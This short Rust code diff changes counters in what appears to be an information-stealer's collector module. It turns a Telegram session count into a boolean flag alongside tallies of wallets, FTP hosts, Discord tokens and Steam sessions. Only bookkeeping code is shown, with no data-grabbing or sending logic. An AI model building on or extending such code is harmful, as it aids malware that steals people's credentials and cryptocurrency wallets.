@@ -1,5 +1,5 @@
 use crate::{Browser, Collector, Device, FileGrabber, Software, Vpn};
-use core::sync::atomic::AtomicUsize;
+use core::sync::atomic::{AtomicBool, AtomicUsize};
 
 macro_rules! impl_atomic_usize_counter {
     ($field:ident) => {
@@ -59,7 +59,7 @@ impl Browser for AtomicUsizeBrowser {
 pub struct AtomicUsizeSoftware {
     wallets: AtomicUsize,
     ftp_hosts: AtomicUsize,
-    telegram_sessions: AtomicUsize,
+    telegram: AtomicBool,
     discord_tokens: AtomicUsize,
     steam_session: AtomicUsize,
 }
@@ -67,7 +67,7 @@ pub struct AtomicUsizeSoftware {
 impl Software for AtomicUsizeSoftware {
     impl_atomic_usize_counter!(wallets);
     impl_atomic_usize_counter!(ftp_hosts);
-    impl_atomic_usize_counter!(telegram_sessions);
+    impl_atomic_bool_flag!(telegram);
     impl_atomic_usize_counter!(discord_tokens);
     impl_atomic_usize_counter!(steam_session);
 }
